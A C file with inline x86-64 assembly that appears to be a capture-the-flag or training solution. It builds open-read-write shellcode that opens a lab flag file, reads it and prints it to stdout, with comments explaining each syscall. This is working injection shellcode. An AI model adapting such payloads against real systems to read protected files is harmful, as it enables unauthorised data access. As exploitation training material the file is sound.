// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run\n"
    "run:\n"

    "# push '/home/shell_basic/flag_name_is_loooooong'\n"
    "xor rax, rax;"
    "push rax\n"
    "mov rax, 0x676e6f6f6f6f6f6f\n"
    "push rax\n"
    "mov rax, 0x6c5f73695f656d61\n"
    "push rax\n"
    "mov rax, 0x6e5f67616c662f63\n"
    "push rax\n"
    "mov rax, 0x697361625f6c6c65\n"
    "push rax\n"
    "mov rax, 0x68732f656d6f682f\n"
    "push rax\n"

    "# open(path, RD_ONLY, NULL)\n"
    "mov rdi, rsp       # rdi = path ; '/home/shell_basic/flag_name_is_loooooong'\n"
    "xor rsi, rsi       # rsi = 0    ; RD_ONLY\n"
    "xor rdx, rdx       # rdx = 0    ; NULL\n"
    "mov rax, 2         # rax = 2    ; syscall number for open\n"
    "syscall            # open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)\n"
    
    "# read(fd, buf, size)\n"
    "mov rdi, rax       # rdi = rax = fd(File Descriptor)\n"
    "sub rsp, 0x30      # rsp -= 0x30\n"
    "mov rsi, rsp       # rsi = rsp   ; buf\n"
    "mov rdx, 0x30      # rdx = 0x30  ; size\n"
    "xor rax, rax       # rax = 0     ; syscall number for read\n"
    "syscall            # read(fd, buf, 0x30)\n"

    "# write(1, buf, size)\n"
    "mov rdi, 1         # rdi = 1 ; stdout\n"
    "mov rax, 1         # rax = 1 ; syscall number for write\n"
    "syscall            # write(stdout, buf, 0x30)\n"

    "# exit(0)\n"
    "xor rdi, rdi       # rdi = 0\n"
    "mov rax, 0x3c      # rax = 0x3c ; syscall number for exit\n"
    "syscall            # exit(0)\n"
);

void run();

int main() { 
    // run 함수에서 전체 ORW 시나리오 실행
    run(); 
    return 0;
}



